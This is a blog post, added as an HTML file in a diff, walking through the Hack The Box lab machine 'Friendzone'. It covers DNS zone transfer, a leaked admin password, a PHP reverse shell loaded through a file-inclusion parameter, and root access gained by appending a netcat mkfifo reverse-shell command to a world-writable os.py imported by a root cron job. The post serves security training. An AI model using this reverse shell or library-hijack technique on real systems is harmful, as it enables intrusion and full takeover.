@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en" prefix="og: https://ogp.me/ns#">
+<head>
+<meta charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible"
+      content="IE=edge">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0" />
+<meta name="description"
+      content="Adventures of Functional Mediocrity" />
+<meta name="keywords"
+      content="zola, theme, ink, hugo-ink, john tuyen, jtuyen" /> 
+
+<title>John Tuyen | Friendzone</title>
+<meta
+  property="og:title"
+  content="John Tuyen | Friendzone"
+/>
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://johntuyen.com/posts/htb-friendzone/" />
+<meta property="og:description" content="Adventures of Functional Mediocrity" />
+<meta property="og:image" content="" />
+<meta property="og:image:url" content="" />
+<meta property="og:image:secure_url" content="" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="Friendzone" />
+<meta name="twitter:description" content="Adventures of Functional Mediocrity" />
+<meta property="twitter:image" content="" />
+
+<link rel="alternate"
+          type="application/rss+xml"
+          title="John Tuyen"
+          href="https://johntuyen.com/atom.xml">
+    <link rel="preconnect"
+          href="https://fonts.googleapis.com">
+    <link rel="preconnect"
+          href="https://fonts.gstatic.com"
+          crossorigin>
+    <!-- <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">  -->
+    <link href="https://fonts.googleapis.com/css2?family=Andada+Pro&display=swap&family=Playfair+Display"
+          rel="stylesheet">
+    <link rel="stylesheet"
+          href="https://johntuyen.com/base.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/feather-icons/4.28.0/feather.min.js"
+            integrity="sha512-7x3zila4t2qNycrtZ31HO0NnJr8kg2VI67YLoRSyi9hGhRN66FHYWr7Axa9Y1J9tGYHVBPqIjSE1ogHrJTz51g=="
+            crossorigin="anonymous"></script>
+</head>
+
+<body>
+    <header>
+        <a class="site-name"
+           href="/">
+            <h1>John Tuyen</h1>
+        </a>
+        <div class="site-description">
+            <p>Adventures of Functional Mediocrity</p>
+        </div>
+        <nav>
+            <div class="links"> 
+            <a 
+                href="https://johntuyen.com/ ">About</a> 
+            <a 
+                href="https://johntuyen.com/posts/ ">Posts</a> 
+            <a 
+                href="https://johntuyen.com/gaze/ ">Gaze</a> 
+            <a 
+                href="https://johntuyen.com/wiretap/ ">Wiretap</a> 
+            <a 
+                href="https://johntuyen.com/tags/ ">Tags</a> 
+            <a 
+                href="https://johntuyen.com/search/ ">Search</a> 
+            </div>
+        </nav>
+    </header>
+    <article>
+    
+
+<section class="post">
+  <div class="post-header">
+    <div class="meta">
+      <div class="date">
+        <span class="day">11</span>
+        <span class="rest">Jul 19</span>
+      </div>
+    </div>
+
+    <div class="matter">
+      <h1 class="title">Friendzone </h1>
+    </div>
+  </div>
+    
+  <article><ol>
+<li>
+<p>The initial <code>Nmap</code> scans shows the following ports opened:</p>
+<ul>
+<li>21, 22, 53, 80, 139, 443.</li>
+</ul>
+<p>Lets start with port 80. The site displays a web page that says “Have you ever been friendzoned?” with an image. The source code doesn't show much, it was coded with simple HTML tags.</p>
+<p><code>GoBuster</code> scans shows an accessible <code>robots.txt</code> and wordpress file and directory. <code>robots.txt</code> doesn't contain anything besides “seriously?!”. The wordpress directory is blank and I began enumerating the directory to see if <code>gobuster</code> can find other hidden files/directories.</p>
+</li>
+<li>
+<p>While <code>gobuster</code> is running, I'm moving on with enumerating port 53 which is a DNS service. With my limited experience with CTFs so far, I know that when port 53 is open for enumeration, a zone transfer command is required.</p>
+<p>Before I begin running DNS commands to enumerate the service, I have to figure out what is the domain name I am targeting. On the main <code>index.html</code> page:</p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>Email us at: info@friendzoneportal.red
+</span></code></pre>
+<p>This means our target will be <code>friendzoneportal.red</code>. I'll add it to our host file.</p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>10.10.10.123  friendzoneportal.red
+</span></code></pre>
+<p>Use dig to see if zone transfer is vulnerable:</p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>dig axfr friendzoneportal.red @10.10.10.123
+</span></code></pre>
+<p><img src="https://johntuyen.com/posts/htb-friendzone/htb-friendzone-dig1.png" alt="htb-friendzone-dig1" /></p>
+<p>Looks like it is. Lets try and navigate to each one and see if it will uncover more clues.</p>
+</li>
+<li>
+<p><code>https://admin.friendzoneportal.red</code> is the only URL that is accessible.</p>
+<p><img src="https://johntuyen.com/posts/htb-friendzone/htb-friendzone-admin.png" alt="htb-friendzone-admin" /></p>
+<p>I haven't found any clues in regards to possible username and passwords. I tried the guessable combinations but no luck. Source code doesn't show anything interesting.</p>
+</li>
+<li>
+<p>I'm moving to the next service, Samba shares. <code>Enum4linux</code> shows the following shares are accessible:</p>
+<p><img src="https://johntuyen.com/posts/htb-friendzone/htb-friendzone-enum4linux.png" alt="htb-friendzone-enum4linux" /></p>
+<p>Connecting to the general share shows there is a <code>creds.txt</code> file that contains:</p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>creds for the admin THING:
+</span><span>
+</span><span>admin:WORKWORKHhallelujah@#
+</span></code></pre>
+<p>I guess this is the credentials I'm looking for the admin panel? Lets try.</p>
+<p><img src="https://johntuyen.com/posts/htb-friendzone/htb-friendzone-adminfail.png" alt="htb-friendzone-adminfail" /></p>
+<p>Darn, now I'm stuck on what to do here.</p>
+</li>
+<li>
+<p>I guess I have to move to the next service, 443. My <code>Nmap</code> scan shows the SSL cert with a domain name that wasn't found on the main page:</p>
+<p><img src="https://johntuyen.com/posts/htb-friendzone/htb-friendzone-ssl.png" alt="htb-friendzone-ssl" /></p>
+<p><code>friendzone.red</code> domain?? I'll have to enumerate this domain using dig after adding the domain to our hosts file.</p>
+<p><img src="https://johntuyen.com/posts/htb-friendzone/htb-friendzone-dig2.png" alt="htb-friendzone-dig2" /></p>
+<p>More domains has been uncovered. Lets see which one of these URLs lead to anything.</p>
+<p><img src="https://johntuyen.com/posts/htb-friendzone/htb-friendzone-administrator1.png" alt="htb-friendzone-administrator1" /></p>
+</li>
+<li>
+<p>Trying the same login that I found in <code>creds.txt</code>, it worked! It page tells us that I should navigate to a <code>dashboard.php</code> page that shows:</p>
+<p><img src="https://johntuyen.com/posts/htb-friendzone/htb-friendzone-dashboard.png" alt="htb-friendzone-dashboard" /></p>
+<p>Navigating to the url shows us this:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=timestamp
+</span></code></pre>
+<p><img src="https://johntuyen.com/posts/htb-friendzone/htb-friendzone-imageparam.png" alt="htb-friendzone-imageparam" /></p>
+<p>I proceeded to try and see if it's vulnerable to LFI/RFI but no luck. See if it's vulnerable to PHP wrappers, no luck.</p>
+<p><img src="https://johntuyen.com/posts/htb-friendzone/htb-friendzone-lfi.png" alt="htb-friendzone-lfi" /></p>
+<p>I began enumerating again using <code>dirsearch</code> on <code>administrator1.friendzone.red</code>. While that is running, I noticed <code>https://uploads.friendzone.red/files/</code> is accessible.</p>
+<p><img src="https://johntuyen.com/posts/htb-friendzone/htb-friendzone-uploads.png" alt="htb-friendzone-uploads" /></p>
+<p>I tried uploading a php file with reverse shell code and a message indicates it has been “uploaded successfully”. I tried the possible ways of accessing this file stored somewhere but no where can be found even through Samba mapping. Is it possible that this form's response is misleading? Pressing the upload button without a file attachment renders “upload successful” message as well. I believe this is a rabbit hole.</p>
+</li>
+<li>
+<p>Going back to <code>dirsearch</code> results, it found a <code>timestamp.php</code> file. This is the file that renders the timestamp on the dashboard page.</p>
+<p>After reading through my nmap scripts carefully, I noticed that the smb script found the paths where the file are being stored. The <code>development</code> share shows that the files are stored at <code>/etc/Development</code> folder.</p>
+<p><img src="https://johntuyen.com/posts/htb-friendzone/htb-friendzone-scriptpath.png" alt="htb-friendzone-scriptpath" /></p>
+<p>I guess I can try to upload my reverse shell to development shared folder and try to LFI the path? I figure this would be a good guess because I know that the dashboard page tells us to load parameters to render the images and timestamp. I can only guess that the “pagename=” parameter can load other files.</p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>smbclient //10.10.10.123/development
+</span><span>
+</span><span>put rs.php
+</span></code></pre>
+<p>Navigating the url:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=/etc/Development/rs.php
+</span></code></pre>
+<p>Nada. Not sure why it's not working. Taking a step back, look at how “timestamp” loads in the parameter, it doesn't use a .php extension. Lets try without the php extension.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=/etc/Development/rs
+</span></code></pre>
+<p>Tada, a successful low privilege shell to obtain user flag.</p>
+<p><img src="https://johntuyen.com/posts/htb-friendzone/htb-friendzone-userflag.png" alt="htb-friendzone-userflag" /></p>
+</li>
+</ol>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<ol>
+<li>
+<p>Ran the standard <code>linenum</code> and <code>linuxprivchecker</code> scripts, I noticed something unusual with this python script:</p>
+<p><img src="https://johntuyen.com/posts/htb-friendzone/htb-friendzone-ospy.png" alt="htb-friendzone-ospy" /></p>
+<p>Why would an OS python module require 777? I'll take a note of this just in case I need it.</p>
+</li>
+<li>
+<p>While I'm digging through this system and see if there are useful information to be found, I located this credential file at <code>/var/www/mysql_data.conf</code>.</p>
+<p><img src="https://johntuyen.com/posts/htb-friendzone/htb-friendzone-mysqlcreds.png" alt="htb-friendzone-mysqlcreds" /></p>
+<p>I tried using this credential to log into SSH and indeed it works. Full user shell has been achieved.</p>
+</li>
+<li>
+<p>After spending some time on the system, I don't see anything else that immediately stands out. Time to run <code>pspy64</code> and see what is running on the background.</p>
+<p>After waiting awhile, I noticed there is a python scripts that runs as <code>UID=0</code> which is root account.</p>
+<p><img src="https://johntuyen.com/posts/htb-friendzone/htb-friendzone-pspy64.png" alt="htb-friendzone-pspy64" /></p>
+</li>
+<li>
+<p>Taking a look at what the <code>reporter.py</code> script is about, it's' importing the OS module as seen earlier.</p>
+<p><img src="https://johntuyen.com/posts/htb-friendzone/htb-friendzone-reporter.png" alt="htb-friendzone-reporter" /></p>
+<p>This is our ticket to run as root privileges as all I have to do is inject code into the <code>os.py</code> module as I have full privileges to the file and the <code>reporter.py</code> script doesn't.</p>
+</li>
+<li>
+<p>Inject this code at the very end of the <code>os.py</code> file.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#bf616a;">system</span><span>(&#39;</span><span style="color:#a3be8c;">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.3 4444 &gt;/tmp/f</span><span>&#39;)
+</span></code></pre>
+</li>
+<li>
+<p>Wait for the cronjob to run and you should be able to get the reverse shell and obtain the root flag.</p>
+<p><img src="https://johntuyen.com/posts/htb-friendzone/htb-friendzone-pspyafter.png" alt="htb-friendzone-pspyafter" /></p>
+<p><img src="https://johntuyen.com/posts/htb-friendzone/htb-friendzone-rooted.png" alt="htb-friendzone-rooted" /></p>
+</li>
+</ol>
+</article>
+
+  
+    
+  
+  <ul class="tags">
+    
+      <li><a href='https://johntuyen.com/tags/hackthebox'>hackthebox</a></li>
+    
+  </ul>
+  
+  
+    
+</section>
+</article>
+    <footer>
+        <div class="social">
+            <ul> 
+                 
+                <li>
+                    <a href="https://github.com/jtuyen"
+                       title="Github" rel="me"><i data-feather="github"></i></a>
+                </li>
+                 
+                 
+                <li>
+                    <a href="https://twitter.com/jtuyen"
+                       title="Twitter"
+                       rel="me"><i data-feather="twitter"></i></a>
+                </li>
+                
+                
+                
+                <li>
+                    <a href="https://johntuyen.com/johntuyenprotonmailcom-pgp.asc" title="PGP" rel="me">
+                        <i data-feather="lock"></i>
+                    </a>
+                </li>
+                
+                <li>
+                    <a href="https://johntuyen.com/atom.xml"
+                       title="John Tuyen"><i data-feather="rss"></i></a>
+                </li>
+            </ul>
+        </div>
+        <p> © John Tuyen 2024
+
+        
+        
+        </p>
+    </footer>
+    <script>
+        feather.replace();
+    </script> 
+    </body>
+</html>
